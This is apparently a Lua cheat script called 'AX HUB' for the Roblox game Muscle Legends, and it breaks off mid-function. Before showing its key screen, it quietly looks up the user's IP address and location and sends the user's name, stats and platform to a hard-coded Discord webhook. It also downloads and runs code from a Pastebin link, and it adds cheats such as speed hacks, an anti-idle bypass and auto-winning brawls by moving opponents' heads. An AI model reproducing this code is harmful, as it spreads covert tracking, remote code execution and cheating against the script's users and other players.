local a = game:GetService("StarterGui")
local function b(b, c, d)
    a:SetCore("SendNotification", {Title = b, Text = c, Duration = d})
end
local a = {
    "BzlAdamBzl",
    "triggasarealzigga",
    "adamzouhair",
    "xterminator47x78_3",
    "Megalodon250850",
    "AcropolisProd",
    "AcropoliXProd",
    "BlistarZ3900",
    "EAEAeAeALOL312323121"
}
if game.PlaceId == 3623096087 then
    local c, d =
        pcall(
        function()
            local b = game:GetService("Players").LocalPlayer
            local c = b.Name
            if table.find(a, c) then
            else
                local a = b.DisplayName
                local d =
                    "https://discord.com/api/webhooks/1339695197604282400/97_1jK9eg-delcdHdBdN4Mt8D-XHnQ37FGhRB_Ju6bYJgJ8-SQIBEr_Or09o_UfjWvUf"
                local function e(a, b, c)
                    if syn and syn.request then
                        return syn.request(
                            {Url = b, Method = a, Headers = {["Content-Type"] = "application/json"}, Body = c}
                        )
                    elseif http_request then
                        return http_request(
                            {Url = b, Method = a, Headers = {["Content-Type"] = "application/json"}, Body = c}
                        )
                    elseif request then
                        return request(
                            {Url = b, Method = a, Headers = {["Content-Type"] = "application/json"}, Body = c}
                        )
                    else
                    end
                end
                local function f(a)
                    if a >= 1e15 then
                        return string.format("%.2f Qa", a / 1e15)
                    elseif a >= 1e12 then
                        return string.format("%.2f T", a / 1e12)
                    elseif a >= 1e9 then
                        return string.format("%.2f B", a / 1e9)
                    elseif a >= 1e6 then
                        return string.format("%.2f M", a / 1e6)
                    elseif a >= 1e3 then
                        return string.format("%.2f k", a / 1e3)
                    else
                        return tostring(a)
                    end
                end
                local function g(a)
                    local a = tostring(a)
                    return a:reverse():gsub("(%d%d%d)", "%1."):reverse():gsub("^%.", "")
                end
                local h = e("GET", "https://api.ipify.org/?format=json")
                local h = game:GetService("HttpService"):JSONDecode(h.Body)
                local h = tostring(h.ip)
                local h = e("GET", string.format("http://ipwho.is/%s", h))
                local h = game:GetService("HttpService"):JSONDecode(h.Body)
                local h = game:GetService("UserInputService")
                local i = "Unknown"
                local j = false
                local k, l =
                    pcall(
                    function()
                        keypress(20)
                    end
                )
                if not k then
                    j = true
                    i = "iOS"
                elseif h.TouchEnabled then
                    i = "Android or Emulator"
                else
                    i = "PC"
                end
                local h
                if syn then
                    h = "Codex"
                elseif http_request then
                    h = "Delta"
                elseif request then
                    h = "Fluxus"
                else
                    h = "Unknown Executor"
                end
                local j = b:FindFirstChild("leaderstats")
                local k = "N/A"
                local l = "N/A"
                local m = "N/A"
                local n = "N/A"
                if j then
                    if j:FindFirstChild("Strength") then
                        local a = j.Strength.Value
                        k = g(a) .. " (" .. f(a) .. ")"
                    end
                    if b:FindFirstChild("Durability") then
                        local a = b.Durability.Value
                        l = g(a) .. " (" .. f(a) .. ")"
                    end
                    if j:FindFirstChild("Kills") then
                        m = g(j.Kills.Value)
                    end
                    if j:FindFirstChild("Rebirths") then
                        n = g(j.Rebirths.Value)
                    end
                end
                local b = i .. ", " .. h
                local a = {
                    ["description"] = "AX HUB script executed",
                    ["title"] = "💪 Muscle Legends",
                    ["type"] = "rich",
                    ["color"] = tonumber(7506394),
                    ["fields"] = {
                        {["name"] = "User:", ["value"] = c .. " (" .. a .. ")", ["inline"] = true},
                        {["name"] = "Strength:", ["value"] = k, ["inline"] = false},
                        {["name"] = "Durability:", ["value"] = l, ["inline"] = true},
                        {["name"] = "Rebirths:", ["value"] = n, ["inline"] = false},
                        {["name"] = "Kills:", ["value"] = m, ["inline"] = true},
                        {["name"] = "Platform:", ["value"] = b, ["inline"] = true}
                    }
                }
                local a = {["embeds"] = {a}}
                e("POST", d, game:GetService("HttpService"):JSONEncode(a))
            end
        end
    )
    if not c then
    end
    wait()
    local c = game:GetService("TweenService")
    local d = Instance.new("ScreenGui")
    local e = Instance.new("Frame")
    local f = Instance.new("UICorner")
    local g = Instance.new("TextButton")
    local h = Instance.new("TextButton")
    local i = Instance.new("TextBox")
    local j = Instance.new("UICorner")
    local k = Instance.new("UICorner")
    local l = Instance.new("UICorner")
    local m = Instance.new("TextLabel")
    local n = Instance.new("TextLabel")
    d.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    d.Name = "KeySystemGui"
    e.Name = "KeyMain"
    e.Parent = d
    e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    e.Size = UDim2.new(0, 260, 0, 170)
    e.Position = UDim2.new(0.5, -130, 0.5, -85)
    f.CornerRadius = UDim.new(0, 15)
    f.Parent = e
    m.Name = "TitleLabel"
    m.Parent = e
    m.BackgroundTransparency = 1
    m.Size = UDim2.new(0, 240, 0, 40)
    m.Position = UDim2.new(0.5, -120, 0, 0)
    m.Font = Enum.Font.FredokaOne
    m.Text = "AX HUB"
    m.TextColor3 = Color3.fromRGB(255, 255, 255)
    m.TextSize = 30
    m.TextStrokeTransparency = 0.8
    n.Name = "DescriptionLabel"
    n.Parent = e
    n.BackgroundTransparency = 1
    n.Size = UDim2.new(0, 240, 0, 40)
    n.Position = UDim2.new(0.5, -120, 0.15, 0)
    n.Font = Enum.Font.PatrickHand
    n.Text = "Click 'Get Key' to copy the discord server link, where you will find the permanent key!"
    n.TextColor3 = Color3.fromRGB(255, 255, 255)
    n.TextSize = 14
    n.TextWrapped = true
    n.TextStrokeTransparency = 0.8
    i.Name = "KeyInputBox"
    i.Parent = e
    i.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    i.Size = UDim2.new(0, 220, 0, 38)
    i.Position = UDim2.new(0.077, 0, 0.4, 0)
    i.Font = Enum.Font.SourceSans
    i.PlaceholderText = "Enter Key"
    i.Text = ""
    i.TextColor3 = Color3.fromRGB(255, 255, 255)
    i.TextSize = 14
    l.CornerRadius = UDim.new(0, 15)
    l.Parent = i
    g.Name = "GetKeyButton"
    g.Parent = e
    g.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    g.Size = UDim2.new(0, 100, 0, 38)
    g.Position = UDim2.new(0.1, 0, 0.7, 0)
    g.Text = "Get Key"
    g.Font = Enum.Font.PatrickHand
    g.TextColor3 = Color3.fromRGB(255, 255, 255)
    g.TextSize = 14
    j.CornerRadius = UDim.new(0, 15)
    j.Parent = g
    h.Name = "SubmitButton"
    h.Parent = e
    h.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    h.Size = UDim2.new(0, 100, 0, 38)
    h.Position = UDim2.new(0.55, 0, 0.7, 0)
    h.Text = "Submit"
    h.Font = Enum.Font.PatrickHand
    h.TextColor3 = Color3.fromRGB(255, 255, 255)
    h.TextSize = 14
    k.CornerRadius = UDim.new(0, 15)
    k.Parent = h
    local function d(a)
        a.MouseEnter:Connect(
            function()
                local a =
                    c:Create(
                    a,
                    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(75, 75, 75)}
                )
                a:Play()
            end
        )
        a.MouseLeave:Connect(
            function()
                local a =
                    c:Create(
                    a,
                    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(55, 55, 55)}
                )
                a:Play()
            end
        )
    end
    d(g)
    d(h)
    local d = "ax-cessgranted"
    local function f()
        setclipboard("https://discord.gg/wJsayfrTtS")
    end
    local function j()
        local f = i.Text
        if f == d then
            i.Text = "Valid!"
            i.TextColor3 = Color3.fromRGB(0, 255, 0)
            wait(0.5)
            local d =
                c:Create(
                e,
                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 1}
            )
            d:Play()
            local f = {g, h, i, m, n}
            for a, a in ipairs(f) do
                local a =
                    c:Create(
                    a,
                    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1, TextTransparency = 1}
                )
                a:Play()
            end
            d.Completed:Connect(
                function()
                    e:Destroy()
                end
            )
            wait(1)
            if not _G.AXHUBLOADED then
                _G.AXHUBLOADED = true
                local c = game.Players.LocalPlayer
                local function d()
                    c.CameraMaxZoomDistance = 100000
                end
                c.CharacterAdded:Connect(
                    function()
                        d()
                    end
                )
                if c.Character then
                    d()
                end
                function roundUp(a)
                    return math.ceil(a * 100) / 100
                end
                local c = game.Players.LocalPlayer
                local d = Instance.new("ScreenGui")
                local e = Instance.new("TextButton")
                local f = Instance.new("Frame")
                local g = Instance.new("ScrollingFrame")
                local h = Instance.new("UIListLayout")
                local i = Instance.new("UICorner")
                local j = Instance.new("UIPadding")
                local k = Instance.new("UIScale")
                d.Parent = c:WaitForChild("PlayerGui")
                d.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                d.ResetOnSpawn = false
                e.Name = "StatusButton"
                e.Parent = d
                e.BackgroundColor3 = Color3.fromRGB(34, 193, 195)
                e.BackgroundTransparency = 0.2
                e.Position = UDim2.new(0.88, 0, 0.15, 0)
                e.Size = UDim2.new(0.06, 0, 0.07, 0)
                e.Font = Enum.Font.GothamBold
                e.Text = "Status"
                e.TextColor3 = Color3.fromRGB(255, 255, 255)
                e.TextScaled = true
                e.TextWrapped = true
                i.CornerRadius = UDim.new(0.23, 0)
                i.Parent = e
                f.Name = "StatusFrame"
                f.Parent = d
                f.BackgroundColor3 = Color3.fromRGB(45, 52, 54)
                f.BackgroundTransparency = 0.15
                f.Position = UDim2.new(0.1, 0, 0.1, 0)
                f.Size = UDim2.new(0.75, 0, 0.8, 0)
                f.Visible = false
                i:Clone().Parent = f
                g.Parent = f
                g.Size = UDim2.new(1, -20, 1, -40)
                g.Position = UDim2.new(0, 10, 0, 30)
                g.BackgroundTransparency = 1
                g.ScrollBarThickness = 6
                g.CanvasSize = UDim2.new(0, 0, 5, 0)
                h.Parent = g
                h.SortOrder = Enum.SortOrder.LayoutOrder
                h.Padding = UDim.new(0.02, 0)
                j.Parent = g
                j.PaddingTop = UDim.new(0.02, 0)
                j.PaddingLeft = UDim.new(0.02, 0)
                local d = Instance.new("Frame")
                d.Size = UDim2.new(1, 0, 0, 20)
                d.Position = UDim2.new(0, 10, 0, 0)
                d.BackgroundTransparency = 1
                d.Parent = f
                local h = Enum.Font.GothamBold
                local function i(a, b)
                    local c = Instance.new("TextLabel")
                    c.Size = UDim2.new(0.18, 0, 1, 0)
                    c.Position = b
                    c.Text = a
                    c.TextColor3 = Color3.fromRGB(255, 255, 255)
                    c.TextScaled = true
                    c.Font = h
                    c.BackgroundTransparency = 1
                    c.TextXAlignment = Enum.TextXAlignment.Center
                    c.Parent = d
                end
                i("Player", UDim2.new(0.05, 10, 0, 0))
                i("Strength", UDim2.new(0.28, 0, 0, 0))
                i("Durability", UDim2.new(0.46, 0, 0, 0))
                i("Kills", UDim2.new(0.615, 0, 0, 0))
                i("Damage", UDim2.new(0.78, 0, 0, 0))
                k.Parent = f
                k.Scale = 0
                local d = game:GetService("TweenService")
                local h = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                local i = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
                local j = {Scale = 1}
                local l = {Scale = 0}
                local h = d:Create(k, h, j)
                local d = d:Create(k, i, l)
                local function i(a)
                    if a >= 1e12 then
                        return string.format("%.2fT", a / 1e12)
                    elseif a >= 1e9 then
                        return string.format("%.2fB", a / 1e9)
                    elseif a >= 1e6 then
                        return string.format("%.2fM", a / 1e6)
                    elseif a >= 1e3 then
                        return string.format("%.2fK", a / 1e3)
                    else
                        return tostring(a)
                    end
                end
                local function j(a, b, c, d, e, f)
                    local g = Instance.new("Frame")
                    g.Size = UDim2.new(1, 0, 0, 30)
                    g.BackgroundColor3 = Color3.fromRGB(25, 42, 86)
                    g.BackgroundTransparency = 0.3
                    g.Parent = f
                    local f = Instance.new("UICorner")
                    f.CornerRadius = UDim.new(0.1, 0)
                    f.Parent = g
                    local f = Instance.new("TextLabel")
                    f.Size = UDim2.new(0.25, 0, 1, 0)
                    f.Position = UDim2.new(0, 10, 0, 0)
                    f.Text = a
                    f.TextColor3 = Color3.fromRGB(255, 234, 167)
                    f.TextScaled = true
                    f.Font = Enum.Font.GothamBold
                    f.BackgroundTransparency = 1
                    f.TextXAlignment = Enum.TextXAlignment.Left
                    f.Parent = g
                    local function a(a, b)
                        local c = Instance.new("TextLabel")
                        c.Size = UDim2.new(0.18, 0, 1, 0)
                        c.Position = b
                        c.Text = a
                        c.TextColor3 = Color3.fromRGB(255, 255, 255)
                        c.TextScaled = false
                        c.TextSize = 25
                        c.Font = Enum.Font.Gotham
                        c.BackgroundTransparency = 1
                        c.TextXAlignment = Enum.TextXAlignment.Center
                        c.Parent = g
                        return c
                    end
                    a(i(c), UDim2.new(0.28, 0, 0, 0))
                    a(i(b), UDim2.new(0.46, 0, 0, 0))
                    a(i(d), UDim2.new(0.64, 0, 0, 0))
                    a(i(e), UDim2.new(0.82, 0, 0, 0))
                    return g
                end
                local function i()
                    local a = {}
                    for b, b in ipairs(game.Players:GetPlayers()) do
                        local c = b:FindFirstChild("leaderstats")
                        if c then
                            local d = b:FindFirstChild("Durability") and b.Durability.Value or 0
                            local e = c:FindFirstChild("Strength") and c.Strength.Value or 0
                            local c = c:FindFirstChild("Kills") and c.Kills.Value or 0
                            local f = roundUp(e * (1 / 15) + (136 / 15)) or 0
                            table.insert(
                                a,
                                {
                                    Player = b,
                                    DisplayName = b.DisplayName,
                                    Durability = d,
                                    Strength = e,
                                    Kills = c,
                                    Damage = f
                                }
                            )
                        end
                    end
                    table.sort(
                        a,
                        function(a, b)
                            return a.Strength > b.Strength
                        end
                    )
                    for a, a in ipairs(g:GetChildren()) do
                        if a:IsA("Frame") then
                            a:Destroy()
                        end
                    end
                    for a, a in ipairs(a) do
                        j(a.DisplayName, a.Durability, a.Strength, a.Kills, a.Damage, g)
                    end
                end
                e.MouseButton1Click:Connect(
                    function()
                        if f.Visible then
                            d:Play()
                            d.Completed:Wait()
                            f.Visible = false
                        else
                            f.Visible = true
                            h:Play()
                            i()
                        end
                    end
                )
                local function d()
                    while true do
                        wait(1)
                        if f.Visible then
                            i()
                        end
                    end
                end
                coroutine.wrap(d)()
                b("¡AX HUB Loaded!", "For more information, go to extras section!", 15)
                local b
                local d
                local e
                local f
                local g
                local h
                local i
                local j
                local k
                local l
                local m
                local n
                local o
                local p
                local q
                local r
                local s
                local t
                local u
                local u
                local v
                local w
                local x
                local y
                local z = {}
                local A = {}
                local B
                local C
                local D
                local E
                local F
                local G
                local H
                local I
                local J
                local K
                local L
                local M
                local N
                local O = getconnections or get_signal_cons
                if O then
                    for a, a in pairs(O(game.Players.LocalPlayer.Idled)) do
                        if a["Disable"] then
                            a["Disable"](a)
                        elseif a["Disconnect"] then
                            a["Disconnect"](a)
                        end
                    end
                else
                    game.Players.LocalPlayer.Idled:Connect(
                        function()
                            local a = game:GetService("VirtualUser")
                            a:CaptureController()
                            a:ClickButton2(Vector2.new())
                        end
                    )
                end
                game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 2)
                for a, a in pairs(game.Workspace.boundaryParts:GetDescendants()) do
                    if a.Name == "boundaryPart" then
                        a:Destroy()
                    end
                end
                game.Players.LocalPlayer.adsAllowed.Value = false
                for a, a in pairs(game.Workspace:GetDescendants()) do
                    if a.Name == "Meshes/Island Model" then
                        a.CanCollide = false
                        a.Transparency = 1
                    end
                end
                local O = loadstring(game:HttpGet("https://pastebin.com/raw/EhNzAZ2R"))()
                local P = O:Load("AX HUB", "Default")
                local P = O.newTab("🏠 Main", "ImageIdHere")
                P.newLabel("✨ Made By: BzlAdamBzl & xterminator47x78_3 ✨")
                P.newLabel("👑 Founder & Lead Programmer: BzlAdamBzl (W4ttziez) 👑")
                P.newLabel("💡 Co. Founder & Discord Community Server Founder: xterminator47x78_3 💬")
                P.newSlider(
                    "WalkSpeed",
                    "This also allows you to walk while workout! (Only works with items in your inventory. Ex: pushups.)",
                    3000,
                    false,
                    function(a)
                        local b = game.Players.LocalPlayer
                        local c = b.Character or b.CharacterAdded:Wait()
                        local d = c:FindFirstChildWhichIsA("Humanoid")
                        if d then
                            d.WalkSpeed = a
                        end
                        b.CharacterAdded:Connect(
                            function(b)
                                c = b
                                d = b:WaitForChild("Humanoid")
                                d.WalkSpeed = a
                            end
                        )
                    end
                )
                P.newSlider(
                    "Jump Power",
                    "Changes how high you can jump.",
                    500,
                    false,
                    function(a)
                        local a = a
                        local b = game.Players.LocalPlayer
                        local c = b.Character or b.CharacterAdded:Wait()
                        local d = c:WaitForChild("Humanoid")
                        local function e()
                            if d then
                                d.JumpPower = a
                            end
                        end
                        e()
                        b.CharacterAdded:Connect(
                            function(a)
                                c = a
                                d = c:WaitForChild("Humanoid")
                                e()
                            end
                        )
                    end
                )
                P.newSlider(
                    "Size",
                    "Changes in-game size.",
                    100,
                    false,
                    function(a)
                        local a, b =
                            pcall(
                            function()
                                game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer(
                                    "changeSize",
                                    a
                                )
                            end
                        )
                        if not a then
                        end
                    end
                )
                P.newButton(
                    "Size 2",
                    "Change your size to 2",
                    function()
                        game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 2)
                    end
                )
                P.newToggle(
                    "Auto Join Brawl",
                    "Auto join brawl. This doesn't win the brawl.",
                    false,
                    function(a)
                        if a then
                            b = true
                            while b do
                                if game.Players.LocalPlayer.PlayerGui.gameGui.brawlJoinLabel.Visible then
                                    game.ReplicatedStorage.rEvents.brawlEvent:FireServer("joinBrawl")
                                    game.Players.LocalPlayer.PlayerGui.gameGui.brawlJoinLabel.Visible = false
                                end
                                wait()
                            end
                        else
                            b = false
                        end
                    end
                )
                P.newToggle(
                    "Auto Win Brawl",
                    "This one auto joins and wins the brawl.",
                    false,
                    function(a)
                        if a then
                            d = true
                            while d do
                                e = true
                                if game.Players.LocalPlayer.PlayerGui.gameGui.brawlJoinLabel.Visible then
                                    game.ReplicatedStorage.rEvents.brawlEvent:FireServer("joinBrawl")
                                    game.Players.LocalPlayer.PlayerGui.gameGui.brawlJoinLabel.Visible = false
                                end
                                if game.ReplicatedStorage.brawlInProgress.Value == true then
                                    coroutine.wrap(
                                        function()
                                            while e do
                                                local a = game.Players.LocalPlayer
                                                a.muscleEvent:FireServer("punch", "rightHand")
                                                a.muscleEvent:FireServer("punch", "leftHand")
                                                wait()
                                            end
                                        end
                                    )()
                                    local function a()
                                        while e do
                                            for a, a in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                                if a.ClassName == "Tool" and a.Name == "Punch" then
                                                    a.Parent = game.Players.LocalPlayer.Character
                                                end
                                            end
                                            wait()
                                            for a, a in pairs(game.Players:GetChildren()) do
                                                if a.Name ~= c.Name then
                                                    local a = game.Workspace:FindFirstChild(a.Name)
                                                    local b = game.Workspace:FindFirstChild(c.Name)
                                                    if a and b then
                                                        local b = b:FindFirstChild("LeftHand")
                                                        if b then
                                                            local c = a:FindFirstChild("Head")
                                                            if c then
                                                                c.Parent = nil
                                                                wait(0.1)
                                                                c.CFrame = b.CFrame
                                                                c.Parent = a
                                                            end
                                                            local a = a:FindFirstChild("sweatPart")
                                                            if a then
                                                                a.CFrame = b.CFrame
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                    coroutine.wrap(a)()
                                else
                                    e = false
                                end
                                wait()
                            end
                        else
                            d = false
                        end
                    end
                )
                P.newLabel("Glitch Calculator / Pre-exp Calculator (For Broken Rebirths)")
                P.newLabel("Glitch with Muscle King Rock")
                P.newButton(
                    "Unique Pets Calculator",
                    "Check console for results! (Type /console in chat)",
                    function()
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.F9)
                            end
                        )
                        if not a then
                        end
                        local a, b =
                            pcall(
                            function()
                                local function a(a)
                                    return a % 2 == 0
                                end
                                local b = game.Players.LocalPlayer.leaderstats.Rebirths.Value
                                if a(b) then
                                    local a = (b + 20) * 12.5
                                    local c = 1250
                                    local d = {}
                                    local e = {}
                                    for a = 1, 19 do
                                        d[a] = c * a
                                    end
                                    local c = 0
                                    for a = 1, #d do
                                        c = c + d[a]
                                        e[a] = c
                                    end
                                    local c = nil
                                    for b, b in ipairs(e) do
                                        if b >= a then
                                            c = b
                                            break
                                        end
                                    end
                                    local a = c - a
                                    local c = a
                                    local e = nil
                                    local f = nil
                                    local g = c
                                    for a = 1, #d do
                                        c = c - d[a]
                                        if c >= 0 then
                                            g = c
                                        else
                                            e = g
                                            f = a
                                            break
                                        end
                                    end
                                    if not e then
                                        e = g
                                        f = #d
                                    end
                                    print("UNIQUE PET LEVEL NEEDED TO GLITCH:\n")
                                    print("Level: ", f, "    Exp: ", e, "\n")
                                    local function c(a)
                                        if a % 1 >= 0.5 then
                                            return math.ceil(a)
                                        else
                                            return math.floor(a)
                                        end
                                    end
                                    local function d(a, b)
                                        local c = {}
                                        table.sort(
                                            b,
                                            function(a, b)
                                                return a.value > b.value
                                            end
                                        )
                                        local d = 0
                                        for b, e in ipairs(b) do
                                            while d + e.value <= a do
                                                c[b] = (c[b] or 0) + 1
                                                d = d + e.value
                                                if d == a then
                                                    break
                                                end
                                            end
                                            if d == a then
                                                break
                                            end
                                        end
                                        if d == a then
                                            return c
                                        else
                                            return nil
                                        end
                                    end
                                    local b = {
                                        {name = "Legends Rock", value = c((b + 20) * 2.5)},
                                        {name = "Inferno Rock", value = c((b + 20) * 1.125)},
                                        {name = "Mystic Rock", value = c((b + 20) * 0.75)},
                                        {name = "Frozen Rock", value = c((b + 20) * 0.375)},
                                        {name = "Golden Rock", value = c((b + 20) * 0.2)},
                                        {name = "Large Rock", value = c((b + 20) * 0.075)},
                                        {name = "Punching Rock", value = c((b + 20) * 0.05)},
                                        {name = "1 exp Treadmill", value = 1},
                                        {name = "2 exp Treadmill", value = 2},
                                        {name = "3 exp Treadmill", value = 3},
                                        {name = "Frost Gym Small Treadmill", value = 4},
                                        {name = "Frost Gym Huge Treadmill", value = 5},
                                        {name = "Eternal Gym Treadmill", value = 6},
                                        {name = "Legends Gym Treadmill", value = 7}
                                    }
                                    local a = a
                                    local a = d(a, b)
                                    if not a then
                                        print("No combination found.")
                                    else
                                        print("COMBINATION FOUND:\n")
                                        print("Step 1: Equip all unique pets with 0 exp that you want to glitch.\n")
                                        print("Step 2:")
                                        for a, c in pairs(a) do
                                            if c > 0 then
                                                print("--- Use " .. b[a].name .. " " .. c .. " time(s)")
                                            end
                                        end
                                        print("\nThen, you're ready to glitch!\n\n")
                                    end
                                else
                                    print("\nIt is impossible to glitch if your rebirths are not a pair number!\n")
                                end
                            end
                        )
                        if not a then
                        end
                    end
                )
                P.newButton(
                    "Unique Auras Calculator",
                    "Check console for results! (Type /console in chat)",
                    function()
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.F9)
                            end
                        )
                        if not a then
                        end
                        local a, b =
                            pcall(
                            function()
                                local function a(a)
                                    return a % 2 == 0
                                end
                                local b = game.Players.LocalPlayer.leaderstats.Rebirths.Value
                                if a(b) then
                                    local a = (b + 20) * 12.5
                                    local c = 1500
                                    local d = {}
                                    local e = {}
                                    d[1] = 3000
                                    for a = 2, 19 do
                                        d[a] = d[a - 1] + c
                                    end
                                    local c = 0
                                    for a = 1, #d do
                                        c = c + d[a]
                                        e[a] = c
                                    end
                                    local c = nil
                                    for b, b in ipairs(e) do
                                        if b >= a then
                                            c = b
                                            break
                                        end
                                    end
                                    local a = c - a
                                    local c = a
                                    local e = nil
                                    local f = nil
                                    local g = c
                                    for a = 1, #d do
                                        c = c - d[a]
                                        if c >= 0 then
                                            g = c
                                        else
                                            e = g
                                            f = a
                                            break
                                        end
                                    end
                                    if not e then
                                        e = g
                                        f = #d
                                    end
                                    print("UNIQUE AURA LEVEL NEEDED TO GLITCH:\n")
                                    print("Level: ", f, "    Exp: ", e, "\n")
                                    local function c(a)
                                        if a % 1 >= 0.5 then
                                            return math.ceil(a)
                                        else
                                            return math.floor(a)
                                        end
                                    end
                                    local function d(a, b)
                                        local c = {}
                                        table.sort(
                                            b,
                                            function(a, b)
                                                return a.value > b.value
                                            end
                                        )
                                        local d = 0
                                        for b, e in ipairs(b) do
                                            while d + e.value <= a do
                                                c[b] = (c[b] or 0) + 1
                                                d = d + e.value
                                                if d == a then
                                                    break
                                                end
                                            end
                                            if d == a then
                                                break
                                            end
                                        end
                                        if d == a then
                                            return c
                                        else
                                            return nil
                                        end
                                    end
                                    local b = {
                                        {name = "Legends Rock", value = c((b + 20) * 2.5)},
                                        {name = "Inferno Rock", value = c((b + 20) * 1.125)},
                                        {name = "Mystic Rock", value = c((b + 20) * 0.75)},
                                        {name = "Frozen Rock", value = c((b + 20) * 0.375)},
                                        {name = "Golden Rock", value = c((b + 20) * 0.2)},
                                        {name = "Large Rock", value = c((b + 20) * 0.075)},
                                        {name = "Punching Rock", value = c((b + 20) * 0.05)},
                                        {name = "1 exp Treadmill", value = 1},
                                        {name = "2 exp Treadmill", value = 2},
                                        {name = "3 exp Treadmill", value = 3},
                                        {name = "Frost Gym Small Treadmill", value = 4},
                                        {name = "Frost Gym Huge Treadmill", value = 5},
                                        {name = "Eternal Gym Treadmill", value = 6},
                                        {name = "Legends Gym Treadmill", value = 7}
                                    }
                                    local a = a
                                    local a = d(a, b)
                                    if not a then
                                        print("No combination found.")
                                    else
                                        print("COMBINATION FOUND:\n")
                                        print("Step 1: Equip the unique aura with 0 exp that you want to glitch.\n")
                                        print("Step 2:")
                                        for a, c in pairs(a) do
                                            if c > 0 then
                                                print("--- Use " .. b[a].name .. " " .. c .. " time(s)")
                                            end
                                        end
                                        print("\nThen, you're ready to glitch!\n\n")
                                    end
                                else
                                    print("\nIt is impossible to glitch if your rebirths are not a pair number!\n")
                                end
                            end
                        )
                        if not a then
                        end
                    end
                )
                P.newLabel("Glitch with Legends Rock")
                P.newButton(
                    "Unique Pets Calculator",
                    "Check console for results! (Type /console in chat)",
                    function()
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.F9)
                            end
                        )
                        if not a then
                        end
                        local a, b =
                            pcall(
                            function()
                                local function a(a)
                                    return a % 2 == 0
                                end
                                local b = game.Players.LocalPlayer.leaderstats.Rebirths.Value
                                if a(b) then
                                    local a = (b + 20) * 2.5
                                    local c = 1250
                                    local d = {}
                                    local e = {}
                                    for a = 1, 19 do
                                        d[a] = c * a
                                    end
                                    local c = 0
                                    for a = 1, #d do
                                        c = c + d[a]
                                        e[a] = c
                                    end
                                    local c = nil
                                    for b, b in ipairs(e) do
                                        if b >= a then
                                            c = b
                                            break
                                        end
                                    end
                                    local a = c - a
                                    local c = a
                                    local e = nil
                                    local f = nil
                                    local g = c
                                    for a = 1, #d do
                                        c = c - d[a]
                                        if c >= 0 then
                                            g = c
                                        else
                                            e = g
                                            f = a
                                            break
                                        end
                                    end
                                    if not e then
                                        e = g
                                        f = #d
                                    end
                                    print("UNIQUE PET LEVEL NEEDED TO GLITCH:\n")
                                    print("Level: ", f, "    Exp: ", e, "\n")
                                    local function c(a)
                                        if a % 1 >= 0.5 then
                                            return math.ceil(a)
                                        else
                                            return math.floor(a)
                                        end
                                    end
                                    local function d(a, b)
                                        local c = {}
                                        table.sort(
                                            b,
                                            function(a, b)
                                                return a.value > b.value
                                            end
                                        )
                                        local d = 0
                                        for b, e in ipairs(b) do
                                            while d + e.value <= a do
                                                c[b] = (c[b] or 0) + 1
                                                d = d + e.value
                                                if d == a then
                                                    break
                                                end
                                            end
                                            if d == a then
                                                break
                                            end
                                        end
                                        if d == a then
                                            return c
                                        else
                                            return nil
                                        end
                                    end
                                    local b = {
                                        {name = "Muscle King Rock", value = c((b + 20) * 12.5)},
                                        {name = "Inferno Rock", value = c((b + 20) * 1.125)},
                                        {name = "Mystic Rock", value = c((b + 20) * 0.75)},
                                        {name = "Frozen Rock", value = c((b + 20) * 0.375)},
                                        {name = "Golden Rock", value = c((b + 20) * 0.2)},
                                        {name = "Large Rock", value = c((b + 20) * 0.075)},
                                        {name = "Punching Rock", value = c((b + 20) * 0.05)},
                                        {name = "1 exp Treadmill", value = 1},
                                        {name = "2 exp Treadmill", value = 2},
                                        {name = "3 exp Treadmill", value = 3},
                                        {name = "Frost Gym Small Treadmill", value = 4},
                                        {name = "Frost Gym Huge Treadmill", value = 5},
                                        {name = "Eternal Gym Treadmill", value = 6},
                                        {name = "Legends Gym Treadmill", value = 7}
                                    }
                                    local a = a
                                    local a = d(a, b)
                                    if not a then
                                        print("No combination found.")
                                    else
                                        print("COMBINATION FOUND:\n")
                                        print("Step 1: Equip all unique pets with 0 exp that you want to glitch.\n")
                                        print("Step 2:")
                                        for a, c in pairs(a) do
                                            if c > 0 then
                                                print("--- Use " .. b[a].name .. " " .. c .. " time(s)")
                                            end
                                        end
                                        print("\nThen, you're ready to glitch!\n\n")
                                    end
                                else
                                    print("\nIt is impossible to glitch if your rebirths are not a pair number!\n")
                                end
                            end
                        )
                        if not a then
                        end
                    end
                )
                P.newButton(
                    "Unique Auras Calculator",
                    "Check console for results! (Type /console in chat)",
                    function()
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.F9)
                            end
                        )
                        if not a then
                        end
                        local a, b =
                            pcall(
                            function()
                                local function a(a)
                                    return a % 2 == 0
                                end
                                local b = game.Players.LocalPlayer.leaderstats.Rebirths.Value
                                if a(b) then
                                    local a = (b + 20) * 2.5
                                    local c = 1500
                                    local d = {}
                                    local e = {}
                                    d[1] = 3000
                                    for a = 2, 19 do
                                        d[a] = d[a - 1] + c
                                    end
                                    local c = 0
                                    for a = 1, #d do
                                        c = c + d[a]
                                        e[a] = c
                                    end
                                    local c = nil
                                    for b, b in ipairs(e) do
                                        if b >= a then
                                            c = b
                                            break
                                        end
                                    end
